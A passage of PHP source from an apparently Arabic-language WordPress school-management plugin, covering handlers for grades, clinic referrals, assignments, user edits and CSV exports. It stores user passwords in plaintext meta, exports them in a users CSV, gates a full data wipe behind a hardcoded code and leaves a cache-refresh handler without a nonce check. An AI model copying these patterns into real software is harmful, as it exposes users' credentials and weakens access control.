
        if ($_POST['confirm_code'] !== '1011996') {
            wp_send_json_error('كود التأكيد غير صحيح');
        }

        global $wpdb;
        require_once(ABSPATH . 'wp-admin/includes/user.php');

        $wpdb->query("TRUNCATE TABLE {$wpdb->prefix}sm_students");
        $wpdb->query("TRUNCATE TABLE {$wpdb->prefix}sm_records");
        $wpdb->query("TRUNCATE TABLE {$wpdb->prefix}sm_messages");
        $wpdb->query("TRUNCATE TABLE {$wpdb->prefix}sm_confiscated_items");
        $wpdb->query("TRUNCATE TABLE {$wpdb->prefix}sm_logs");

        $teachers = get_users(array('role' => 'sm_teacher'));
        foreach ($teachers as $t) wp_delete_user($t->ID);

        $parents = get_users(array('role' => 'sm_parent'));
        foreach ($parents as $p) wp_delete_user($p->ID);

        SM_Logger::log('تهيأة النظام بالكامل', 'تم مسح كافة البيانات والجداول');
        wp_send_json_success('تمت تهيأة النظام بالكامل بنجاح');
    }

    public function ajax_update_teacher() {
        if (!current_user_can('إدارة_المستخدمين')) wp_send_json_error('Unauthorized');
        if (!wp_verify_nonce($_POST['sm_nonce'], 'sm_teacher_action')) wp_send_json_error('Security check failed');

        $user_id = intval($_POST['edit_teacher_id']);

        $target_user = get_userdata($user_id);
        if ($target_user && $target_user->user_email === 'info@eess.online') {
            wp_send_json_error('عفواً، لا يمكن تعديل أو تغيير حساب مدير النظام المحمي والمدعوم ذاتياً.');
        }

        $user_data = array(
            'ID' => $user_id,
            'display_name' => sanitize_text_field($_POST['display_name'])
        );
        if (!empty($_POST['user_pass'])) {
            $user_data['user_pass'] = $_POST['user_pass'];
            update_user_meta($user_id, 'sm_temp_pass', $_POST['user_pass']);
        }
        $result = wp_update_user($user_data);
        if (is_wp_error($result)) wp_send_json_error($result->get_error_message());

        $role = sanitize_text_field($_POST['role']);
        SM_Settings::change_user_role($user_id, $role, $_POST);

        // Employee Number Handling with Manual Correction Support
        $emp_num = sanitize_text_field($_POST['employee_number'] ?? ($_POST['teacher_id'] ?? ''));
        if (!empty($emp_num)) {
            global $wpdb;
            $duplicate_check = $wpdb->get_var($wpdb->prepare(
                "SELECT user_id FROM {$wpdb->usermeta} WHERE meta_key = 'eess_employee_number' AND meta_value = %s AND user_id != %d LIMIT 1",
                $emp_num,
                $user_id
            ));
            if (!$duplicate_check) {
                update_user_meta($user_id, 'eess_employee_number', $emp_num);
            }
        }

        update_user_meta($user_id, 'sm_teacher_id', sanitize_text_field($_POST['teacher_id']));
        update_user_meta($user_id, 'sm_phone', sanitize_text_field($_POST['phone']));
        update_user_meta($user_id, 'sm_account_status', sanitize_text_field($_POST['account_status']));

        if (!empty($_POST['specialization'])) {
            update_user_meta($user_id, 'sm_specialization', sanitize_text_field($_POST['specialization']));
        }

        // Clean old assignments
        delete_user_meta($user_id, 'sm_assigned_sections');
        delete_user_meta($user_id, 'sm_supervised_classes');

        if (isset($_POST['assigned'])) {
            $assigned = array_map('sanitize_text_field', $_POST['assigned']);
            if ($role === 'sm_teacher') {
                update_user_meta($user_id, 'sm_assigned_sections', $assigned);
            } elseif ($role === 'sm_supervisor') {
                update_user_meta($user_id, 'sm_supervised_classes', $assigned);
            }
        }

        wp_send_json_success('Updated');
    }

    public function ajax_add_assignment() {
        if (!is_user_logged_in()) wp_send_json_error('Unauthorized');
        if (!wp_verify_nonce($_POST['sm_nonce'], 'sm_assignment_action')) wp_send_json_error('Security check');

        $sender_id   = get_current_user_id();
        $title       = sanitize_text_field($_POST['title'] ?? '');
        $description = sanitize_textarea_field($_POST['description'] ?? '');
        $file_url    = esc_url_raw($_POST['file_url'] ?? '');
        $subject     = sanitize_text_field($_POST['subject'] ?? '');
        $due_date    = sanitize_text_field($_POST['due_date'] ?? '');
        $type        = sanitize_text_field($_POST['type'] ?? 'assignment');

        $receivers = array();
        if (!empty($_POST['receiver_ids'])) {
            if (is_array($_POST['receiver_ids'])) {
                $receivers = array_map('intval', $_POST['receiver_ids']);
            } else {
                $receivers = array_map('intval', explode(',', $_POST['receiver_ids']));
            }
        } elseif (!empty($_POST['receiver_id'])) {
            $receivers[] = intval($_POST['receiver_id']);
        }

        $receivers = array_unique(array_filter($receivers));

        if (empty($receivers) || empty($title)) {
            wp_send_json_error('يرجى تحديد الطلاب المستهدفين وعنوان الواجب.');
        }

        $success_count = 0;
        foreach ($receivers as $rec_id) {
            $data = array(
                'sender_id'   => $sender_id,
                'receiver_id' => $rec_id,
                'title'       => $title . (!empty($subject) ? " [$subject]" : ""),
                'description' => $description . (!empty($due_date) ? "\n\nتاريخ التسليم: $due_date" : ""),
                'file_url'    => $file_url,
                'type'        => $type
            );
            if (SM_DB::add_assignment($data)) {
                $success_count++;
            }
        }

        if ($success_count > 0) {
            wp_send_json_success(array('message' => "تم إرسال الواجب بنجاح إلى $success_count من الطلاب."));
        } else {
            wp_send_json_error('فشل إرسال الواجب.');
        }
    }

    public function ajax_approve_plan() {
        if (!current_user_can('مراجعة_التحضير')) wp_send_json_error('Unauthorized');
        if (!wp_verify_nonce($_POST['nonce'], 'sm_assignment_action')) wp_send_json_error('Security check');

        global $wpdb;
        $plan_id = intval($_POST['plan_id']);
        $result = $wpdb->update("{$wpdb->prefix}sm_assignments",
            array('receiver_id' => get_current_user_id()), // Mark as approved by current coordinator
            array('id' => $plan_id, 'type' => 'lesson_plan')
        );

        if ($result) wp_send_json_success();
        else wp_send_json_error();
    }

    public function ajax_bulk_delete_users() {
        if (!current_user_can('إدارة_المستخدمين')) wp_send_json_error('Unauthorized');
        if (!wp_verify_nonce($_POST['nonce'], 'sm_teacher_action')) wp_send_json_error('Security check');

        $ids = array_map('intval', explode(',', $_POST['user_ids']));
        require_once(ABSPATH . 'wp-admin/includes/user.php');

        $count = 0;
        foreach ($ids as $id) {
            if ($id != get_current_user_id()) {
                if (wp_delete_user($id)) $count++;
            }
        }
        SM_Logger::log('حذف مستخدمين (جماعي)', "تم حذف عدد ($count) مستخدم من النظام.");
        wp_send_json_success();
    }

    public function ajax_add_clinic_referral() {
        if (!is_user_logged_in() || !current_user_can('تسجيل_مخالفة')) wp_send_json_error('Unauthorized');
        if (!wp_verify_nonce($_POST['nonce'], 'sm_clinic_action')) wp_send_json_error('Security check');

        global $wpdb;
        $student_id = intval($_POST['student_id']);
        $referrer_id = get_current_user_id();

        $result = $wpdb->insert("{$wpdb->prefix}sm_clinic", array(
            'student_id' => $student_id,
            'referrer_id' => $referrer_id,
            'created_at' => current_time('mysql')
        ));

        if ($result) {
            $student = SM_DB::get_student_by_id($student_id);
            SM_Logger::log('تحويل للعيادة', "تم تحويل الطالب: {$student->name} للعيادة");
            wp_send_json_success();
        } else {
            wp_send_json_error('Failed to add referral');
        }
    }

    public function ajax_confirm_clinic_arrival() {
        if (!is_user_logged_in() || !current_user_can('إدارة_العيادة')) wp_send_json_error('Unauthorized');
        if (!wp_verify_nonce($_POST['nonce'], 'sm_clinic_action')) wp_send_json_error('Security check');

        global $wpdb;
        $referral_id = intval($_POST['referral_id']);

        $result = $wpdb->update("{$wpdb->prefix}sm_clinic", array(
            'arrival_confirmed' => 1,
            'arrival_at' => current_time('mysql')
        ), array('id' => $referral_id));

        if ($result) wp_send_json_success();
        else wp_send_json_error('Failed to confirm arrival');
    }

    public function ajax_update_clinic_record() {
        if (!is_user_logged_in() || !current_user_can('إدارة_العيادة')) wp_send_json_error('Unauthorized');
        if (!wp_verify_nonce($_POST['nonce'], 'sm_clinic_action')) wp_send_json_error('Security check');

        global $wpdb;
        $referral_id = intval($_POST['referral_id']);
        $health_condition = sanitize_textarea_field($_POST['health_condition']);
        $action_taken = sanitize_textarea_field($_POST['action_taken']);

        $result = $wpdb->update("{$wpdb->prefix}sm_clinic", array(
            'health_condition' => $health_condition,
            'action_taken' => $action_taken
        ), array('id' => $referral_id));

        if ($result) wp_send_json_success();
        else wp_send_json_error('Failed to update record');
    }

    public function ajax_get_clinic_reports() {
        if (!is_user_logged_in() || !current_user_can('إدارة_العيادة')) wp_send_json_error('Unauthorized');
        if (!wp_verify_nonce($_GET['nonce'] ?? '', 'sm_clinic_action')) wp_send_json_error('Security check failed');

        global $wpdb;
        $type = sanitize_text_field($_GET['report_type']); // day, week, month, term, year
        $start_date = '';
        $end_date = current_time('Y-m-d') . ' 23:59:59';

        switch ($type) {
            case 'day': $start_date = current_time('Y-m-d') . ' 00:00:00'; break;
            case 'week': $start_date = date('Y-m-d', strtotime('-7 days')) . ' 00:00:00'; break;
            case 'month': $start_date = date('Y-m-d', strtotime('-30 days')) . ' 00:00:00'; break;
            case 'term':
                $academic = SM_Settings::get_academic_structure();
                $today = current_time('Y-m-d');
                foreach ($academic['term_dates'] as $t) {
                    if ($today >= $t['start'] && $today <= $t['end']) {
                        $start_date = $t['start'] . ' 00:00:00';
                        $end_date = $t['end'] . ' 23:59:59';
                        break;
                    }
                }
                if (empty($start_date)) $start_date = date('Y-m-01') . ' 00:00:00';
                break;
            case 'year': $start_date = date('Y-01-01') . ' 00:00:00'; break;
        }

        $query = "SELECT c.*, s.name as student_name, s.class_name, s.section, u.display_name as referrer_name
                  FROM {$wpdb->prefix}sm_clinic c
                  JOIN {$wpdb->prefix}sm_students s ON c.student_id = s.id
                  JOIN {$wpdb->prefix}users u ON c.referrer_id = u.ID
                  WHERE c.created_at BETWEEN %s AND %s
                  ORDER BY c.created_at DESC";

        $records = $wpdb->get_results($wpdb->prepare($query, $start_date, $end_date));

        header('Content-Type: text/csv; charset=utf-8');
        header('Content-Disposition: attachment; filename=clinic_report_'.$type.'_'.date('Y-m-d').'.csv');
        $output = fopen('php://output', 'w');
        fprintf($output, chr(0xEF).chr(0xBB).chr(0xBF)); // BOM for Excel
        fputcsv($output, array('التاريخ', 'اسم الطالب', 'الصف', 'الشعبة', 'المحول', 'تأكيد الوصول', 'الحالة الصحية', 'الإجراء المتخذ'));

        foreach ($records as $r) {
            fputcsv($output, array(
                $r->created_at,
                $r->student_name,
                $r->class_name,
                $r->section,
                $r->referrer_name,
                $r->arrival_confirmed ? 'نعم' : 'لا',
                $r->health_condition,
                $r->action_taken
            ));
        }
        fclose($output);
        exit;
    }

    public function ajax_save_grade_ajax() {
        if (!is_user_logged_in() || !current_user_can('manage_grades')) wp_send_json_error('Unauthorized');
        if (!wp_verify_nonce($_POST['nonce'], 'sm_grade_action')) wp_send_json_error('Security check failed');

        $subject = sanitize_text_field($_POST['subject']);
        $user = wp_get_current_user();
        if (in_array('sm_teacher', (array)$user->roles) && !current_user_can('manage_options')) {
            $spec = get_user_meta($user->ID, 'sm_specialization', true);
            if ($spec && $spec !== $subject) {
                wp_send_json_error('غير مسموح لك برصد درجات لمادة غير مخصص لك.');
            }
        }

        global $wpdb;
        $result = $wpdb->insert("{$wpdb->prefix}sm_grades", array(
            'student_id' => intval($_POST['student_id']),
            'subject' => $subject,
            'term' => sanitize_text_field($_POST['term']),
            'grade_val' => sanitize_text_field($_POST['grade_val']),
            'created_at' => current_time('mysql')
        ));

        if ($result) {
            SM_Logger::log('رصد درجة', "تم رصد درجة للطالب ID: {$_POST['student_id']} في مادة $subject");
            wp_send_json_success();
        } else {
            wp_send_json_error('Failed to save grade');
        }
    }

    public function ajax_import_grades() {
        if (!is_user_logged_in() || !current_user_can('manage_grades')) {
            wp_send_json_error('Unauthorized');
        }
        if (!wp_verify_nonce($_POST['nonce'], 'sm_grade_action')) {
            wp_send_json_error('Security check failed');
        }

        $records = isset($_POST['records']) ? json_decode(stripslashes($_POST['records']), true) : array();
        if (empty($records) || !is_array($records)) {
            wp_send_json_error('لا توجد سجلات مستوردة صالحة.');
        }

        global $wpdb;
        $success_count = 0;
        $duplicate_count = 0;

        foreach ($records as $row) {
            $student_code = sanitize_text_field($row['student_code']);
            $subject = sanitize_text_field($row['subject']);
            $term = sanitize_text_field($row['term']);
            $grade_val = sanitize_text_field($row['grade_val']);

            // Find student by student_code
            $student_id = $wpdb->get_var($wpdb->prepare("SELECT id FROM {$wpdb->prefix}sm_students WHERE student_code = %s", $student_code));
            if (!$student_id) {
                // If not found by student_code, try by name
                $student_id = $wpdb->get_var($wpdb->prepare("SELECT id FROM {$wpdb->prefix}sm_students WHERE name = %s", $student_code));
            }

            if (!$student_id) {
                continue;
            }

            // Check if this result is already recorded (duplicate check)
            $existing = $wpdb->get_var($wpdb->prepare(
                "SELECT id FROM {$wpdb->prefix}sm_grades WHERE student_id = %d AND subject = %s AND term = %s AND grade_val = %s",
                $student_id, $subject, $term, $grade_val
            ));

            if ($existing) {
                $duplicate_count++;
                continue;
            }

            $result = $wpdb->insert("{$wpdb->prefix}sm_grades", array(
                'student_id' => $student_id,
                'subject' => $subject,
                'term' => $term,
                'grade_val' => $grade_val,
                'created_at' => current_time('mysql')
            ));

            if ($result) {
                $success_count++;
            }
        }

        SM_Logger::log('استيراد جماعي للدرجات', "تم استيراد ($success_count) نتيجة بنجاح، وتجاهل ($duplicate_count) نتيجة مكررة.");

        wp_send_json_success(array(
            'imported' => $success_count,
            'duplicates' => $duplicate_count
        ));
    }

    public function ajax_get_student_grades_ajax() {
        if (!is_user_logged_in()) wp_send_json_error('Unauthorized');
        $nonce = $_POST['nonce'] ?? ($_POST['sm_nonce'] ?? '');
        if (!wp_verify_nonce($nonce, 'sm_grade_action') && !wp_verify_nonce($nonce, 'sm_admin_action') && !wp_verify_nonce($nonce, 'eess_admin_action')) wp_send_json_error('Security');

        global $wpdb;
        $student_id = intval($_POST['student_id']);

        // Security check: if student, can only see own. If staff, can see all.
        if (in_array('sm_student', (array)wp_get_current_user()->roles)) {
            $student = SM_DB::get_student_by_parent(get_current_user_id());
            if (!$student || $student->id != $student_id) wp_send_json_error('Unauthorized access to grades');
        }

        $grades = $wpdb->get_results($wpdb->prepare("SELECT * FROM {$wpdb->prefix}sm_grades WHERE student_id = %d ORDER BY created_at DESC", $student_id));
        wp_send_json_success($grades);
    }

    public function ajax_delete_grade_ajax() {
        if (!is_user_logged_in() || !current_user_can('manage_grades')) wp_send_json_error('Unauthorized');
        if (!wp_verify_nonce($_POST['nonce'], 'sm_grade_action')) wp_send_json_error('Security check failed');

        global $wpdb;
        $result = $wpdb->delete("{$wpdb->prefix}sm_grades", array('id' => intval($_POST['grade_id'])));

        if ($result) wp_send_json_success();
        else wp_send_json_error('Failed to delete grade');
    }

    public function ajax_add_subject() {
        if (!current_user_can('إدارة_النظام')) wp_send_json_error('Unauthorized');
        if (!wp_verify_nonce($_POST['nonce'], 'sm_admin_action')) wp_send_json_error('Security');

        $name = sanitize_text_field($_POST['name']);
        $grade_ids = isset($_POST['grade_ids']) ? array_map('intval', $_POST['grade_ids']) : array();

        if (empty($grade_ids) && isset($_POST['grade_id'])) {
            $grade_ids = array(intval($_POST['grade_id']));
        }

        if (SM_DB::add_subject($name, $grade_ids)) wp_send_json_success();
        else wp_send_json_error();
    }

    public function ajax_delete_subject() {
        if (!current_user_can('إدارة_النظام')) wp_send_json_error('Unauthorized');
        if (!wp_verify_nonce($_POST['nonce'], 'sm_admin_action')) wp_send_json_error('Security');

        if (SM_DB::delete_subject(intval($_POST['id']))) wp_send_json_success();
        else wp_send_json_error();
    }

    public function ajax_get_subjects() {
        if (!is_user_logged_in()) wp_send_json_error('Unauthorized');
        $grade_id = isset($_GET['grade_id']) ? intval($_GET['grade_id']) : null;
        wp_send_json_success(SM_DB::get_subjects($grade_id));
    }

    public function ajax_save_class_grades() {
        if (!current_user_can('manage_grades')) wp_send_json_error('Unauthorized');
        if (!wp_verify_nonce($_POST['nonce'], 'sm_grade_action')) wp_send_json_error('Security');

        $subject = sanitize_text_field($_POST['subject']);
        $user = wp_get_current_user();
        if (in_array('sm_teacher', (array)$user->roles) && !current_user_can('manage_options')) {
            $spec = get_user_meta($user->ID, 'sm_specialization', true);
            if ($spec && $spec !== $subject) {
                wp_send_json_error('غير مسموح لك برصد درجات لمادة غير مخصص لك.');
            }
        }

        $term = sanitize_text_field($_POST['term']);
        $grades = json_decode(stripslashes($_POST['grades']), true);

        global $wpdb;
        $success = 0;
        foreach ($grades as $student_id => $val) {
            if ($val === '') continue;
            $res = $wpdb->insert("{$wpdb->prefix}sm_grades", array(
                'student_id' => intval($student_id),
                'subject' => $subject,
                'term' => $term,
                'grade_val' => sanitize_text_field($val),
                'created_at' => current_time('mysql')
            ));
            if ($res) $success++;
        }
        wp_send_json_success($success);
    }

    public function ajax_bulk_delete_students() {
        if (!current_user_can('إدارة_الطلاب')) wp_send_json_error('Unauthorized');
        if (!wp_verify_nonce($_POST['nonce'], 'sm_delete_student')) wp_send_json_error('Security');

        $ids = array_map('intval', explode(',', $_POST['student_ids']));
        $count = 0;
        foreach ($ids as $id) {
            if (SM_DB::delete_student($id)) $count++;
        }
        SM_Logger::log('حذف طلاب (جماعي)', "تم حذف عدد ($count) طالب من النظام.");
        wp_send_json_success($count);
    }


    public function ajax_download_plans_zip() {
        if (!current_user_can('manage_options') && !in_array('sm_principal', (array)wp_get_current_user()->roles) && !in_array('sm_coordinator', (array)wp_get_current_user()->roles)) {
            wp_die('Unauthorized');
        }
        if (!wp_verify_nonce($_GET['nonce'], 'sm_admin_action')) wp_die('Security');

        global $wpdb;
        $plans = $wpdb->get_results("SELECT * FROM {$wpdb->prefix}sm_assignments WHERE type = 'lesson_plan'");

        if (empty($plans)) wp_die('No plans to download');

        if (!class_exists('ZipArchive')) {
            wp_die('ZipArchive extension not enabled on this server.');
        }

        $zip = new ZipArchive();
        $zip_name = 'lesson_plans_' . date('Y-m-d') . '.zip';
        $upload_dir = wp_upload_dir();
        $zip_path = $upload_dir['path'] . '/' . $zip_name;

        if ($zip->open($zip_path, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== TRUE) {
            wp_die('Could not create zip file');
        }

        foreach ($plans as $p) {
            if (empty($p->file_url)) continue;

            // Try to get local path
            $file_path = str_replace($upload_dir['baseurl'], $upload_dir['basedir'], $p->file_url);
            if (file_exists($file_path)) {
                $zip->addFile($file_path, basename($file_path));
            }
        }

        $zip->close();

        if (file_exists($zip_path)) {
            header('Content-Type: application/zip');
            header('Content-Disposition: attachment; filename="' . $zip_name . '"');
            header('Content-Length: ' . filesize($zip_path));
            readfile($zip_path);
            unlink($zip_path);
            exit;
        } else {
            wp_die('Failed to generate zip');
        }
    }

    public function ajax_submit_behavior_referral() {
        if (!is_user_logged_in()) {
            wp_send_json_error('عفواً، يجب تسجيل الدخول لتقديم المخالفة السلوكية.');
        }

        if (!wp_verify_nonce($_POST['nonce'] ?? '', 'sm_record_action')) {
            wp_send_json_error('انتهت صلاحية الجلسة. يرجى إعادة المحاولة.');
        }

        $student_id     = intval($_POST['student_id'] ?? 0);
        $title          = sanitize_text_field($_POST['title'] ?? '');
        $classification = sanitize_text_field($_POST['classification'] ?? 'inside_class');
        $degree         = intval($_POST['degree'] ?? 1);
        $details        = sanitize_textarea_field($_POST['details'] ?? '');

        if (!$student_id || empty($title) || empty($details)) {
            wp_send_json_error('جميع الحقول الأساسية مطلوبة.');
        }

        $user = wp_get_current_user();

        // Save referral record
        $record_id = SM_DB::add_record(array(
            'student_id'     => $student_id,
            'teacher_id'     => $user->ID,
            'type'           => $title,
            'classification' => $classification,
            'severity'       => ($degree == 3) ? 'high' : (($degree == 2) ? 'medium' : 'low'),
            'degree'         => $degree,
            'details'        => $details,
            'status'         => 'submitted' // Under review by Discipline Supervisor
        ));

        if ($record_id) {
            SM_Logger::log('تقديم مخالفة سلوكية لطالب', "قدم المعلم {$user->display_name} إحالة سلوكية لطالب ID: $student_id بعنوان: $title");
            wp_send_json_success(array('record_id' => $record_id, 'message' => 'تم تقديم المخالفة السلوكية بنجاح وهي قيد مراجعة وتأكيد مشرف السلوك.'));
        } else {
            wp_send_json_error('حدث خطأ أثناء حفظ الإحالة السلوكية.');
        }
    }

    public function ajax_refresh_system() {
        if (!is_user_logged_in()) {
            wp_send_json_error('Unauthorized');
        }

        global $wpdb;
        // 1. Delete all plugin transients from options table
        $wpdb->query("DELETE FROM {$wpdb->prefix}options WHERE option_name LIKE '_transient_sm_%' OR option_name LIKE '_transient_timeout_sm_%'");
        $wpdb->query("DELETE FROM {$wpdb->prefix}options WHERE option_name LIKE '_transient_eess_%' OR option_name LIKE '_transient_timeout_eess_%'");

        // 2. Clear general WordPress cache
        wp_cache_flush();

        // 3. Clear user capability transients or meta caches
        $users = get_users(array('fields' => array('ID')));
        foreach ($users as $u) {
            clean_user_cache($u->ID);
        }

        // 4. Force reload settings & metrics
        $school_info = SM_Settings::get_school_info();
        $stats = SM_DB::get_statistics();

        wp_send_json_success(array(
            'message' => 'تم تحديث كافة الملفات المؤقتة والذاكرة المؤقتة للخدمات والنظام بنجاح مباشرة من قاعدة البيانات.',
            'school_name' => $school_info['school_name'],
            'stats' => $stats
        ));
    }

    public function ajax_export_users_csv() {
        if (!is_user_logged_in() || !current_user_can('إدارة_المستخدمين')) {
            wp_send_json_error('Unauthorized');
        }
        if (!wp_verify_nonce($_GET['nonce'] ?? '', 'eess_admin_action')) {
            wp_send_json_error('Security check failed');
        }

        $all_users = get_users();

        header('Content-Type: text/csv; charset=utf-8');
        header('Content-Disposition: attachment; filename=users_export_'.date('Y-m-d').'.csv');
        $output = fopen('php://output', 'w');
        fprintf($output, chr(0xEF).chr(0xBB).chr(0xBF)); // BOM for Excel

        fputcsv($output, array('اسم المستخدم', 'البريد الإلكتروني', 'الاسم الكامل', 'الدور / الرتبة', 'رقم الهاتف', 'كلمة المرور', 'رابط الصورة الشخصية', 'المادة التخصصية', 'كود المؤسسة', 'كود المدرسة', 'كود القسم', 'كود المادة'));

        foreach ($all_users as $u) {
            $role = reset($u->roles);
            $phone = get_user_meta($u->ID, 'sm_phone', true);
            $password = get_user_meta($u->ID, 'sm_temp_pass', true) ?: '';
            $photo = get_user_meta($u->ID, 'eess_profile_photo', true) ?: '';
            $specialization = get_user_meta($u->ID, 'sm_specialization', true) ?: '';

            // Fetch user assignments for org export
            global $wpdb;
            $asn = $wpdb->get_row($wpdb->prepare("SELECT * FROM {$wpdb->prefix}eess_user_assignments WHERE user_id = %d LIMIT 1", $u->ID));
            $inst_code = $asn ? $asn->institution_id : '';
            $school_code = $asn ? $asn->school_id : '';
            $dept_code = $asn ? $asn->department_id : '';
            $subj_code = $asn ? $asn->subject_id : '';

            fputcsv($output, array(
                $u->user_login,
                $u->user_email,
                $u->display_name,
                $role,
                $phone,
                $password,
                $photo,
                $specialization,
                $inst_code,
                $school_code,
                $dept_code,
                $subj_code
            ));
        }
        fclose($output);
        exit;
    }

    public function ajax_export_violations_csv() {
        if (!is_user_logged_in() || !current_user_can('إدارة_المخالفات')) wp_send_json_error('Unauthorized');
        if (!wp_verify_nonce($_GET['nonce'] ?? '', 'sm_export_action')) wp_send_json_error('Security check failed');

        global $wpdb;
        $range = sanitize_text_field($_GET['range']); // today, week, month, all
        $start_date = '';
        $end_date = current_time('Y-m-d') . ' 23:59:59';
        $student_code = $_GET['student_code'] ?? '';

        if ($range !== 'all') {
            switch ($range) {
                case 'today': $start_date = current_time('Y-m-d') . ' 00:00:00'; break;
                case 'week': $start_date = date('Y-m-d', strtotime('-7 days')) . ' 00:00:00'; break;
                case 'month': $start_date = date('Y-m-d', strtotime('-30 days')) . ' 00:00:00'; break;
            }
        }

        $query = "SELECT r.*, s.name as student_name, s.class_name, s.section, s.student_code
                  FROM {$wpdb->prefix}sm_records r
                  JOIN {$wpdb->prefix}sm_students s ON r.student_id = s.id
                  WHERE 1=1";

        $params = array();
        if ($start_date) {
            $query .= " AND r.created_at BETWEEN %s AND %s";
            $params[] = $start_date;
            $params[] = $end_date;
        }

        if ($student_code) {
            $query .= " AND s.student_code = %s";
            $params[] = $student_code;
        }

        $query .= " ORDER BY r.created_at DESC";

        $records = empty($params) ? $wpdb->get_results($query) : $wpdb->get_results($wpdb->prepare($query, $params));

        header('Content-Type: text/csv; charset=utf-8');
        header('Content-Disposition: attachment; filename=violations_'.$range.'_'.date('Y-m-d').'.csv');
        $output = fopen('php://output', 'w');
        fprintf($output, chr(0xEF).chr(0xBB).chr(0xBF)); // BOM
        fputcsv($output, array('التاريخ', 'اسم الطالب', 'كود الطالب', 'الصف', 'الشعبة', 'النوع', 'الحدة', 'الدرجة', 'النقاط', 'التفاصيل', 'الإجراء المتخذ'));

        foreach ($records as $r) {
            // Dynamic Linking
            $reg = SM_Settings::get_regulation_by_code($r->violation_code);
            $display_type = $reg ? $reg['name'] : $r->type;
            $display_action = $reg ? $reg['action'] : $r->action_taken;

            fputcsv($output, array(
                $r->created_at,
                $r->student_name,
                $r->student_code,
                $r->class_name,
                $r->section,
                $display_type,
                $r->severity,
                $r->degree,
                $r->points,
                $r->details,
                $display_action
            ));
        }
        fclose($output);
        exit;
    }

    public function handle_form_submission() {
        static $processed = false;
        if ($processed) {
            return;
        }
        $processed = true;

        // Handle Global Central Subject CRUD
        if (isset($_POST['eess_save_global_subject']) && wp_verify_nonce($_POST['sm_admin_nonce'], 'sm_admin_action')) {
            if (current_user_can('إدارة_النظام')) {
                $inst_id = !empty($_POST['inst_id']) ? intval($_POST['inst_id']) : 1;
                $res = EESS_Org_Helper::save_subject($inst_id, array(
                    'id'                  => intval($_POST['sub_id'] ?? 0),
                    'name'                => sanitize_text_field($_POST['sub_name'] ?? ''),
                    'code'                => sanitize_text_field($_POST['sub_code'] ?? ''),
                    'department_id'       => intval($_POST['sub_department_id'] ?? 0),
                    'hod_user_id'         => intval($_POST['sub_hod_user_id'] ?? 0),
                    'coordinator_user_id' => intval($_POST['sub_coordinator_user_id'] ?? 0),
                    'status'              => sanitize_text_field($_POST['sub_status'] ?? 'active'),
                    'grade_ids'           => !empty($_POST['sub_grade_ids']) ? array_map('intval', (array)$_POST['sub_grade_ids']) : array(),
                    'school_ids'          => !empty($_POST['sub_school_ids']) ? array_map('intval', (array)$_POST['sub_school_ids']) : array()
                ));
                if (is_wp_error($res)) {
                    wp_die('خطأ في حفظ المادة المركزية: ' . $res->get_error_message());
                }
                wp_redirect(add_query_arg(array('sm_tab' => 'school-structure', 'sm_admin_msg' => 'settings_saved'), wp_get_referer()));
                exit;
            }
        }

        // Handle Single-Level Institution Model CRUD and Staff Assignments
        if (isset($_POST['eess_save_single_inst']) && wp_verify_nonce($_POST['sm_admin_nonce'], 'sm_admin_action')) {
            if (current_user_can('إدارة_النظام')) {
                $action = sanitize_text_field($_POST['inst_action'] ?? '');
                $inst_id = intval($_POST['inst_id'] ?? 0);

                if ($action === 'add' || $action === 'edit') {
                    global $wpdb;
                    $code_val = intval($_POST['inst_code'] ?? 0);

                    // Unique Numeric Code Validation
                    if ($code_val > 0) {
                        $duplicate_check = $wpdb->get_var($wpdb->prepare(
                            "SELECT id FROM {$wpdb->prefix}eess_institutions WHERE code = %d AND id != %d LIMIT 1",
                            $code_val,
                            $inst_id
                        ));
                        if ($duplicate_check) {
                            wp_die('عذراً، كود المؤسسة (' . $code_val . ') مسجل مسبقاً لمؤسسة أخرى. يرجى اختيار كود رقمي فريد.');
                        }
                    }

                    $inst_data = array(
                        'code'          => $code_val > 0 ? $code_val : $inst_id,
                        'parent_id'     => !empty($_POST['inst_parent_id']) ? intval($_POST['inst_parent_id']) : null,
                        'name'          => sanitize_text_field($_POST['inst_name'] ?? ''),
                        'type'          => sanitize_text_field($_POST['inst_type'] ?? 'مدرسة'),
                        'country'       => sanitize_text_field($_POST['inst_country'] ?? 'الإمارات العربية المتحدة'),
                        'manager_id'    => !empty($_POST['inst_manager_id']) ? intval($_POST['inst_manager_id']) : null,
                        'director_name' => sanitize_text_field($_POST['inst_director_name'] ?? ''),
                        'phone'         => sanitize_text_field($_POST['inst_phone'] ?? ''),
                        'logo_url'      => esc_url_raw($_POST['inst_logo_url'] ?? ''),
                        'address'       => sanitize_textarea_field($_POST['inst_address'] ?? '')
                    );

                    if ($action === 'add') {
                        $inst_id = EESS_Org_Helper::add_institution($inst_data);
                    } else {
                        EESS_Org_Helper::update_institution($inst_id, $inst_data);
                    }

                    // Save integrated staff assignments for this institution
                    if ($inst_id > 0) {
                        $assigned_staff = isset($_POST['assigned_staff_ids']) ? array_map('intval', (array)$_POST['assigned_staff_ids']) : array();

                        // Get existing users currently assigned to this institution
                        global $wpdb;
                        $currently_assigned = $wpdb->get_col($wpdb->prepare(
                            "SELECT DISTINCT user_id FROM {$wpdb->prefix}eess_user_assignments WHERE institution_id = %d",
                            $inst_id
                        ));

                        // Unassign users no longer checked
                        foreach ($currently_assigned as $c_uid) {
                            if (!in_array(intval($c_uid), $assigned_staff)) {
                                $wpdb->delete("{$wpdb->prefix}eess_user_assignments", array('user_id' => $c_uid, 'institution_id' => $inst_id));
                            }
                        }

                        // Assign newly checked staff
                        foreach ($assigned_staff as $s_uid) {
                            $exists = $wpdb->get_var($wpdb->prepare(
                                "SELECT id FROM {$wpdb->prefix}eess_user_assignments WHERE user_id = %d AND institution_id = %d",
                                $s_uid, $inst_id
                            ));
                            if (!$exists) {
                                $wpdb->insert("{$wpdb->prefix}eess_user_assignments", array(
                                    'user_id' => $s_uid,
                                    'institution_id' => $inst_id
                                ));
                            }
                            // Also update profile meta for institution display name
                            update_user_meta($s_uid, 'eess_school_name', $inst_data['name']);
                            update_user_meta($s_uid, 'eess_school_id', $inst_id);
                        }
                    }
                } elseif ($action === 'delete' && $inst_id > 0) {
                    EESS_Org_Helper::delete_institution($inst_id);
                }

                wp_redirect(add_query_arg('sm_admin_msg', 'settings_saved', $_SERVER['REQUEST_URI']));
                exit;
            }
        }

        // Handle Centralized Institutional Data Imports (CSV Parser)
        if (isset($_POST['eess_import_org_csv']) && wp_verify_nonce($_POST['sm_admin_nonce'], 'sm_admin_action')) {
            if (current_user_can('إدارة_النظام') && !empty($_FILES['csv_file']['tmp_name'])) {
